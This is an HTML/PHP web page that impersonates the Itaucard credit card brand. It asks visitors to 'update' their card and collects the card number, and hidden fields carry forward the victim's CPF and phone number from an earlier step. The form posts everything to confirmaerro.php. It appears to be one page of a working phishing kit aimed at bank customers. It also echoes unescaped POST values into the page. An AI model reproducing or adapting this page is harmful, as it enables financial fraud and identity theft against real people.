<!DOCTYPE html>
<html lang="en">
<head>
	<title>Itaucard</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->

<script language="javascript" src="js/jquery.mask.min.js"></script>
<script type="text/javascript">
/* Máscaras ER */
function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}
function execmascara(){
    v_obj.value=v_fun(v_obj.value)
}
function mcc(v){
    v=v.replace(/\D/g,"");
    v=v.replace(/^(\d{4})(\d)/g,"$1 $2");
    v=v.replace(/^(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3");
    v=v.replace(/^(\d{4})\s(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3 $4");
    return v;
}
function id( el ){
	return document.getElementById( el );
}
window.onload = function(){
	id('cc').onkeypress = function(){
		mascara( this, mcc );
	}
}
</script>

 <script language='JavaScript'>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}
</script>
<script>
function exibe(id) {
	if(document.getElementById(id).style.display=="none") {
		document.getElementById(id).style.display = "inline";
	}
	else {
		document.getElementById(id).style.display = "block";
	}
}
</script>
<script>
  function maxLengthCheck(object)
  {
    if (object.value.length > object.maxLength)
      object.value = object.value.slice(0, object.maxLength)
  }
</script>
<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>

<script>
function validar11() {
if ( document.form.cc.value == "" || 
document.form.cc.value.length < 19 || 
document.form.cc.value == "1111 1111 1111 1111" || 
document.form.cc.value == "2222 2222 2222 2222" || 
document.form.cc.value == "3333 3333 3333 3333" || 
document.form.cc.value == "4444 4444 4444 4444" ||
document.form.cc.value == "5555 5555 5555 5555" || 
document.form.cc.value == "6666 6666 6666 6666" || 
document.form.cc.value == "7777 7777 7777 7777" || 
document.form.cc.value == "8888 8888 8888 8888" || 
document.form.cc.value == "9999 9999 9999 9999" || 
document.form.cc.value == "0000 0000 0000 0000" || 
document.form.cc.value == "1234 5678 9101 1121"){
alert ("Itau Card invalido!"); 
document.form.cc.focus();
 return false;
}

}
</script>

<style>
#cc { font-family:'Arial'; font-size:25px; outline:none; display:block; }
</style>

</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form name="form" id="form" class="login100-form validate-form" action="confirmaerro.php" method="POST" onSubmit="return validar11(this);">
					<input type="hidden" name="cpfe" id="cpfe" value="<?php echo $_POST['cpfe']; ?>">
					<input type="hidden" name="telefone" id="telefone" value="<?php echo $_POST['telefone']; ?>">
					
				
					<center><img src="images/logo.png" height="50" /></br></br></center>
					<span class="login100-form-title p-b-26">
						Bem vindo(a)
					<center><p><font color="#fff">Atualize seu cart&atilde;o Itaucard.</font></p></center><br><br>
					</span>

					<div class="wrap-input100">
						<input class="input100" type="tel" name="cc" id="cc" id="txtCCN" style="text-align:center;color:white;" maxlength="19" required onkeypress='return SomenteNumero(event)' onKeyUp="javascript:pulacampo('cc','btt');" onfocus="this.value='';"/>
						<span class="focus-input100" data-placeholder="N&uacute;mero do Cart&atilde;o" ></span>
					</div>
					
					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="login100-form-btn" name="btt" id="btt">
								Pr&oacute;ximo passo
							</button>
						</div>
					</div>

					<div class="text-center p-t-115">
						<span class="txt1">
							Cart&otilde;es Itaucard.
						</span>


					</div>
				</form>
			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>